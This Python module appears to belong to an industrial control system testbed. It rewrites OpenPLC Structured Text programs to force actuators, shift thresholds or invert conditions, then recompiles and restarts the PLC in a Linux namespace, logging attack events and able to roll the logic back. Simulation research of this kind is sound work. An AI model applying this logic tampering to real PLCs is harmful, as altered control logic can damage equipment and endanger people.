#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""OpenPLC logic injection for authorized simulation experiments.

This module edits the generated per-PLC Structured Text program inside the
simulation workspace, recompiles that PLC, and restarts only the target runtime
inside its Linux namespace.  It intentionally does not interact with the
OpenPLC web UI, credentials, or external hosts.
"""
from __future__ import annotations

import argparse
import json
import os
import re
import shutil
import signal
import subprocess
import sys
import time
from pathlib import Path
from typing import Any

from src.control.plc_precompile import copy_binary_atomic, resolve_openplc_root
from src.core.config import load_runtime_config, load_yaml
from src.io.csv import append_jsonl, append_row, raw_dir
from src.metrics.attack_metrics import AttackMetricRecorder


SUPPORTED_MODES = {"force_actuator", "threshold_shift", "invert_condition"}
_STOP = False


def _handle_stop(_signum, _frame) -> None:  # type: ignore[no-untyped-def]
    global _STOP
    _STOP = True


def _install_signal_handlers() -> None:
    signal.signal(signal.SIGTERM, _handle_stop)
    signal.signal(signal.SIGINT, _handle_stop)


def _state_payload(path: Path) -> dict[str, Any]:
    if not path.exists():
        return {}
    try:
        data = json.loads(path.read_text(encoding="utf-8"))
    except Exception:
        return {}
    return data if isinstance(data, dict) else {}


def _write_state(path: Path, payload: dict[str, Any]) -> None:
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(json.dumps(payload, indent=2, sort_keys=True), encoding="utf-8")


class EventWriter:
    def __init__(self, runtime_dir: Path):
        self.runtime_dir = runtime_dir
        self.csv_path = runtime_dir / "csv" / "attack_events.csv"
        self.raw_path = raw_dir(runtime_dir) / "attack_events.jsonl"
        self.metric_recorder = AttackMetricRecorder(runtime_dir)
        self.columns = [
            "timestamp_epoch",
            "iteration",
            "attack",
            "event",
            "target",
            "namespace",
            "mode",
            "message",
        ]

    def write(self, row: dict[str, Any]) -> None:
        payload = {**{col: "" for col in self.columns}, **row}
        append_row(self.csv_path, payload, fixed_columns=self.columns)
        append_jsonl(self.raw_path, payload)
        self.metric_recorder.record(payload, default_event="openplc_logic_event")


def _write_event(events: EventWriter, args: argparse.Namespace, event: str, message: str) -> None:
    mode = ""
    if isinstance(args.injection, dict):
        mode = str(args.injection.get("mode", ""))
    events.write(
        {
            "timestamp_epoch": f"{time.time():.6f}",
            "iteration": args.iteration,
            "attack": args.attack,
            "event": event,
            "target": args.target,
            "namespace": args.namespace,
            "mode": mode,
            "message": message,
        }
    )


def _require_namespace(namespace: str) -> None:
    result = subprocess.run(["ip", "netns", "list"], capture_output=True, text=True, check=False)
    if result.returncode != 0:
        raise RuntimeError(f"cannot list network namespaces: {(result.stderr or '').strip()}")
    names = {line.split()[0] for line in result.stdout.splitlines() if line.split()}
    if namespace not in names:
        raise ValueError(f"target namespace does not exist: {namespace}")


def _pid_alive(pid: int) -> bool:
    try:
        os.kill(pid, 0)
        return True
    except ProcessLookupError:
        return False
    except PermissionError:
        return True


def _process_args(pid: int) -> str:
    result = subprocess.run(["ps", "-p", str(pid), "-o", "args="], capture_output=True, text=True)
    return (result.stdout or "").strip()


def _netns_pids(namespace: str) -> list[int]:
    result = subprocess.run(["ip", "netns", "pids", namespace], capture_output=True, text=True)
    if result.returncode != 0:
        return []
    pids: list[int] = []
    for item in result.stdout.split():
        try:
            pids.append(int(item))
        except ValueError:
            pass
    return pids


def _kill_pids(pids: set[int], *, grace: float = 0.8) -> None:
    live = [pid for pid in pids if _pid_alive(pid)]
    if not live:
        return
    for pid in live:
        try:
            os.kill(pid, signal.SIGTERM)
        except ProcessLookupError:
            pass
    deadline = time.time() + grace
    while time.time() < deadline:
        if not any(_pid_alive(pid) for pid in live):
            return
        time.sleep(0.05)
    for pid in live:
        if _pid_alive(pid):
            try:
                os.kill(pid, signal.SIGKILL)
            except ProcessLookupError:
                pass


def _cleanup_old_plc(namespace: str, binary_path: Path, pid_path: Path) -> None:
    binary_name = binary_path.name
    binary_abs = str(binary_path)
    candidates: set[int] = set()
    try:
        candidates.add(int(pid_path.read_text(encoding="utf-8").strip()))
    except Exception:
        pass
    for pid in _netns_pids(namespace):
        args = _process_args(pid)
        tokens = args.split()
        if binary_abs in args or any(Path(t).name == binary_name for t in tokens):
            candidates.add(pid)
    candidates = {pid for pid in candidates if _pid_alive(pid)}
    if candidates:
        _kill_pids(candidates)
    try:
        pid_path.unlink()
    except FileNotFoundError:
        pass


def _ensure_executable(path: Path) -> None:
    mode = path.stat().st_mode
    if not (mode & 0o111):
        path.chmod(mode | 0o755)


def _launch_plc(namespace: str, binary_path: Path, cwd: Path, log_path: Path) -> subprocess.Popen:
    _ensure_executable(binary_path)
    log_path.parent.mkdir(parents=True, exist_ok=True)
    log_f = log_path.open("a", encoding="utf-8")
    cmd = ["ip", "netns", "exec", namespace, str(binary_path)]
    print("[OPENPLC-LOGIC] restart", " ".join(cmd), flush=True)
    return subprocess.Popen(cmd, cwd=str(cwd), stdout=log_f, stderr=subprocess.STDOUT, start_new_session=True)


def _wait_for_port(namespace: str, host: str, port: int, timeout: float, interval: float = 0.25) -> bool:
    py = (
        "import socket,sys\n"
        "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
        "s.settimeout(1.0)\n"
        f"rc=s.connect_ex(({host!r}, {port}))\n"
        "s.close()\n"
        "sys.exit(0 if rc==0 else 1)\n"
    )
    deadline = time.time() + timeout
    while time.time() < deadline:
        result = subprocess.run(
            ["ip", "netns", "exec", namespace, "python3", "-c", py],
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        if result.returncode == 0:
            return True
        time.sleep(interval)
    return False


def _send_openplc_command(namespace: str, command: str, timeout: float = 3.0) -> str:
    py = (
        "import socket\n"
        f"cmd = {command!r}\n"
        f"timeout = {timeout!r}\n"
        "s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n"
        "s.settimeout(timeout)\n"
        "s.connect(('127.0.0.1', 43628))\n"
        "s.sendall((cmd.strip() + '\\n').encode('utf-8'))\n"
        "try:\n"
        "    data = s.recv(4096)\n"
        "    print(data.decode('utf-8', errors='ignore'), end='')\n"
        "except socket.timeout:\n"
        "    pass\n"
        "s.close()\n"
    )
    result = subprocess.run(["ip", "netns", "exec", namespace, "python3", "-c", py], capture_output=True, text=True)
    if result.returncode != 0:
        raise RuntimeError(f"failed to send OpenPLC command in {namespace}: {(result.stderr or '').strip()}")
    return (result.stdout or "").strip()


def _start_modbus_with_retry(namespace: str, port: int, *, timeout: float = 30.0) -> None:
    deadline = time.time() + timeout
    last_error = ""
    while time.time() < deadline:
        try:
            _send_openplc_command(namespace, f"start_modbus({port})")
        except Exception as exc:
            last_error = str(exc)
        if _wait_for_port(namespace, "127.0.0.1", port, timeout=1.0):
            return
        time.sleep(0.5)
    raise RuntimeError(f"OpenPLC Modbus/TCP did not listen on 127.0.0.1:{port}; last_error={last_error}")


def _bool_literal(raw: Any) -> str:
    value = str(raw).strip().lower()
    if value in {"open", "opened", "true", "on", "1", "yes"}:
        return "TRUE"
    if value in {"closed", "close", "false", "off", "0", "no"}:
        return "FALSE"
    raise ValueError(f"force_actuator state must be open/closed, got {raw!r}")


def _real_literal(raw: Any) -> str:
    value = float(raw)
    if value != value or value in {float("inf"), float("-inf")}:
        raise ValueError(f"invalid threshold value: {raw!r}")
    text = f"{value:.12g}"
    if "e" in text.lower():
        text = f"{value:.12f}".rstrip("0").rstrip(".")
    if "." not in text:
        text += ".0"
    return text


def _actuator_var(target: str, actuator: str) -> str:
    actuator = str(actuator).strip()
    if not actuator:
        raise ValueError("injection actuator is required")
    return actuator if "_" in actuator else f"{target.upper()}_{actuator}"


def _condition_pattern(dependant: str, typ: str, value: Any) -> re.Pattern[str]:
    op = {"below": "<", "above": ">"}[str(typ).strip().lower()]
    literal = re.escape(_real_literal(value))
    dependant = re.escape(str(dependant).strip())
    return re.compile(
        rf"(?P<prefix>\bIF\s+(?P<var>[A-Za-z_]\w*(?:_{dependant})?)\s*)"
        rf"(?P<op>{re.escape(op)})"
        rf"(?P<suffix>\s*{literal}\s+THEN\b)",
        re.IGNORECASE,
    )


def _assignment_after(text: str, start: int, actuator_var: str) -> bool:
    end = text.find("END_IF;", start)
    if end < 0:
        return False
    block = text[start:end]
    return re.search(rf"\b{re.escape(actuator_var)}\s*:=", block, re.IGNORECASE) is not None


def _inject_threshold_shift(text: str, target: str, injection: dict[str, Any]) -> tuple[str, str]:
    rule = injection.get("rule") or {}
    if not isinstance(rule, dict):
        raise ValueError("threshold_shift injection.rule must be a mapping")
    actuator = _actuator_var(target, str(rule.get("actuator", "")))
    dependant = str(rule.get("dependant", "")).strip()
    typ = str(rule.get("type", "")).strip().lower()
    if typ not in {"below", "above"}:
        raise ValueError("threshold_shift rule.type must be below or above")
    if not dependant:
        raise ValueError("threshold_shift rule.dependant is required")
    original = rule.get("original_value")
    injected = _real_literal(rule.get("injected_value"))
    pattern = _condition_pattern(dependant, typ, original)

    for match in pattern.finditer(text):
        if not _assignment_after(text, match.end(), actuator):
            continue
        updated = text[: match.start("suffix")] + f" {injected} THEN" + text[match.end("suffix") :]
        return updated, f"shifted {actuator} {dependant} {typ} threshold to {injected}"
    raise ValueError(f"threshold_shift rule not found for actuator={actuator} dependant={dependant} type={typ}")


def _inject_invert_condition(text: str, target: str, injection: dict[str, Any]) -> tuple[str, str]:
    rule = injection.get("rule") or {}
    if not isinstance(rule, dict):
        raise ValueError("invert_condition injection.rule must be a mapping")
    actuator = _actuator_var(target, str(rule.get("actuator", "")))
    dependant = str(rule.get("dependant", "")).strip()
    typ = str(rule.get("type", "")).strip().lower()
    if typ not in {"below", "above"}:
        raise ValueError("invert_condition rule.type must be below or above")
    value = rule.get("value", rule.get("original_value"))
    pattern = _condition_pattern(dependant, typ, value)
    new_op = ">=" if typ == "below" else "<="

    for match in pattern.finditer(text):
        if not _assignment_after(text, match.end(), actuator):
            continue
        updated = text[: match.start("op")] + new_op + text[match.end("op") :]
        return updated, f"inverted condition for {actuator} {dependant} {typ}"
    raise ValueError(f"invert_condition rule not found for actuator={actuator} dependant={dependant} type={typ}")


def _inject_force_actuator(text: str, target: str, injection: dict[str, Any]) -> tuple[str, str]:
    actuator = _actuator_var(target, str(injection.get("actuator", injection.get("target", ""))))
    state = _bool_literal(injection.get("state", injection.get("value", "open")))
    marker = "\nEND_PROGRAM"
    forced = (
        f"  (* OpenPLC logic injection: force_actuator *)\n"
        f"  {actuator} := {state};\n"
        f"{marker}"
    )
    if marker not in text:
        raise ValueError("cannot locate END_PROGRAM for force_actuator injection")
    return text.replace(marker, forced, 1), f"forced {actuator} to {state}"


def inject_logic(text: str, target: str, injection: dict[str, Any]) -> tuple[str, str]:
    mode = str(injection.get("mode", "")).strip().lower()
    if mode not in SUPPORTED_MODES:
        raise ValueError(f"unsupported injection.mode={mode!r}; expected one of {sorted(SUPPORTED_MODES)}")
    if mode == "force_actuator":
        return _inject_force_actuator(text, target, injection)
    if mode == "threshold_shift":
        return _inject_threshold_shift(text, target, injection)
    return _inject_invert_condition(text, target, injection)


def _compile_one(config_path: Path, target: str) -> None:
    cfg = load_yaml(config_path)
    rt = load_runtime_config(config_path)
    openplc_root = resolve_openplc_root(config_path, cfg, None)
    webserver_dir = openplc_root / "webserver"
    compile_script = webserver_dir / "scripts" / "compile_program.sh"
    st_files_dir = webserver_dir / "st_files"
    built_binary = webserver_dir / "core" / "openplc"
    st_path = rt.plcs[target].st_path
    binary_path = rt.output_dir / "plcs" / target.lower()

    if not compile_script.exists():
        raise FileNotFoundError(f"OpenPLC compile script not found: {compile_script}")
    st_files_dir.mkdir(parents=True, exist_ok=True)
    shutil.copy2(st_path, st_files_dir / st_path.name)
    subprocess.run(["bash", str(compile_script), st_path.name], cwd=str(webserver_dir), check=True)
    if not built_binary.exists():
        raise FileNotFoundError(f"OpenPLC built binary not found: {built_binary}")
    copy_binary_atomic(built_binary, binary_path)


def _restart_runtime(config_path: Path, runtime_dir: Path, target: str, namespace: str) -> int:
    rt = load_runtime_config(config_path)
    output_dir = rt.output_dir
    binary_path = output_dir / "plcs" / target.lower()
    run_dir = output_dir / "run"
    log_path = output_dir / "logs" / f"{target.lower()}.log"
    run_dir.mkdir(parents=True, exist_ok=True)

    _cleanup_old_plc(namespace, binary_path, run_dir / f"{binary_path.name}.pid")
    proc = _launch_plc(namespace=namespace, binary_path=binary_path, cwd=output_dir, log_path=log_path)
    (run_dir / f"{binary_path.name}.pid").write_text(str(proc.pid), encoding="utf-8")
    time.sleep(0.2)
    if proc.poll() is not None:
        raise RuntimeError(f"{target.lower()} exited early with code={proc.returncode}; see {log_path}")
    if not _wait_for_port(namespace, "127.0.0.1", 43628, timeout=20.0):
        raise RuntimeError(f"{target.lower()} in {namespace} did not open OpenPLC interactive server")
    _start_modbus_with_retry(namespace, 502, timeout=30.0)
    return proc.pid


def apply_injection(args: argparse.Namespace) -> int:
    _require_namespace(args.namespace)
    rt = load_runtime_config(args.config)
    target = args.target.upper()
    if target not in rt.plcs:
        raise ValueError(f"target is not a PLC in runtime config: {target}")
    plc = rt.plcs[target]
    if plc.namespace != args.namespace:
        raise ValueError(f"target namespace mismatch for {target}: configured={plc.namespace} requested={args.namespace}")

    events = EventWriter(args.runtime_dir)
    state = _state_payload(args.state_file)
    backup_path = Path(state.get("backup_path") or args.backup_file)
    backup_path.parent.mkdir(parents=True, exist_ok=True)

    original = plc.st_path.read_text(encoding="utf-8")
    if not backup_path.exists():
        shutil.copy2(plc.st_path, backup_path)
    injected, message = inject_logic(original, target, args.injection)
    if injected == original:
        raise RuntimeError("injection did not change PLC logic")
    plc.st_path.write_text(injected, encoding="utf-8")
    try:
        _compile_one(args.config, target)
        plc_pid = _restart_runtime(args.config, args.runtime_dir, target, args.namespace)
    except Exception:
        shutil.copy2(backup_path, plc.st_path)
        try:
            _compile_one(args.config, target)
            _restart_runtime(args.config, args.runtime_dir, target, args.namespace)
        except Exception as rollback_exc:
            print(f"[OPENPLC-LOGIC] rollback failed: {rollback_exc}", file=sys.stderr, flush=True)
        raise

    state.update(
        {
            "attack": args.attack,
            "target": target,
            "namespace": args.namespace,
            "active": True,
            "backup_path": str(backup_path),
            "st_path": str(plc.st_path),
            "restore_on_stop": bool(args.restore_on_stop),
            "updated_epoch": time.time(),
            "plc_pid": plc_pid,
            "message": message,
        }
    )
    _write_state(args.state_file, state)
    _write_event(events, args, "openplc_logic_start", message)
    return 0


def restore_logic(args: argparse.Namespace) -> int:
    _require_namespace(args.namespace)
    rt = load_runtime_config(args.config)
    target = args.target.upper()
    if target not in rt.plcs:
        raise ValueError(f"target is not a PLC in runtime config: {target}")
    plc = rt.plcs[target]
    state = _state_payload(args.state_file)
    backup_path = Path(state.get("backup_path") or args.backup_file)
    events = EventWriter(args.runtime_dir)

    if not backup_path.exists():
        _write_event(events, args, "openplc_logic_restore_skip", f"backup not found: {backup_path}")
        return 0
    shutil.copy2(backup_path, plc.st_path)
    _compile_one(args.config, target)
    plc_pid = _restart_runtime(args.config, args.runtime_dir, target, args.namespace)
    state.update(
        {
            "attack": args.attack,
            "target": target,
            "namespace": args.namespace,
            "active": False,
            "restored_epoch": time.time(),
            "plc_pid": plc_pid,
        }
    )
    _write_state(args.state_file, state)
    _write_event(events, args, "openplc_logic_restore", f"restored {plc.st_path} from {backup_path}")
    return 0


def run(args: argparse.Namespace) -> int:
    if args.action == "restore":
        return restore_logic(args)
    _install_signal_handlers()
    apply_injection(args)
    while not _STOP:
        time.sleep(0.2)
    if args.restore_on_stop:
        restore_logic(args)
    return 0


def build_parser() -> argparse.ArgumentParser:
    p = argparse.ArgumentParser(description="Authorized OpenPLC logic injection simulator")
    p.add_argument("--config", required=True, type=Path)
    p.add_argument("--attack", required=True)
    p.add_argument("--target", required=True)
    p.add_argument("--namespace", required=True)
    p.add_argument("--runtime-dir", required=True, type=Path)
    p.add_argument("--state-file", required=True, type=Path)
    p.add_argument("--backup-file", required=True, type=Path)
    p.add_argument("--injection-json", required=True)
    p.add_argument("--iteration", type=int, default=-1)
    p.add_argument("--restore-on-stop", action=argparse.BooleanOptionalAction, default=True)
    p.add_argument("--action", choices=["start", "restore"], default="start")
    return p


def main() -> int:
    args = build_parser().parse_args()
    args.config = args.config.resolve()
    args.runtime_dir = args.runtime_dir.resolve()
    args.state_file = args.state_file.resolve()
    args.backup_file = args.backup_file.resolve()
    try:
        args.injection = json.loads(args.injection_json)
    except json.JSONDecodeError as exc:
        raise ValueError(f"invalid --injection-json: {exc}") from exc
    if not isinstance(args.injection, dict):
        raise ValueError("--injection-json must decode to a mapping")
    return run(args)


if __name__ == "__main__":
    try:
        raise SystemExit(main())
    except Exception as exc:
        print(f"[OPENPLC-LOGIC] fatal: {exc}", file=sys.stderr, flush=True)
        raise SystemExit(1)
